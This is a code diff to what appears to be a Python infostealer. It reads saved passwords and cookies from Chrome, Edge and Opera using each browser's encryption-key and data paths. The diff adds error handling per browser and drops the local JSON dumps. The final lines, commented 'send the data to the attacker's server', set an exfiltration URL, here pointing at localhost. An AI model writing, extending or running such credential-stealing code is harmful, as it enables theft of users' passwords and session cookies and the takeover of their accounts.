@@ -120,40 +120,24 @@ files = []
 
 for i in range(len(loginDataPaths)):
     if i == 0:
-        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
-        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
-        # with open('ChromePasswords.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(passFile, f, indent=4)
-        # with open('ChromeCookies.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(cookieFile, f, indent=4)
+        try:
+            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        except:
+            print("No Chrome installed!")
     if i == 1:
-        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
-        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
-        # with open('EdgePasswords.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(passFile, f, indent=4)
-        # with open('EdgeCookies.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(cookieFile, f, indent=4)
+        try:
+            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        except:
+            print("No Edge installed!")
     if i == 2:
-        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
-        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
-        # with open('OperaPasswords.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(passFile, f, indent=4)
-        # with open('OperaCookies.json', 'w') as f:
-        #     # Write the JSON object to the file
-        #     json.dump(cookieFile, f, indent=4)
-
+        try:
+            files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+            files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        except:
+            print("No Opera installed!")
    
- 
-# test = buildCookieJson(encKeyPath=encKeyPaths[0], cookieDataPath=cookieDataPaths[0])
-
-# with open('testCookies.json', 'w') as f:
-#     # Write the JSON object to the file
-#     json.dump(test, f, indent=4)
 
 # send the data to the attacker's server
 url = 'http://localhost:5000/send/json'
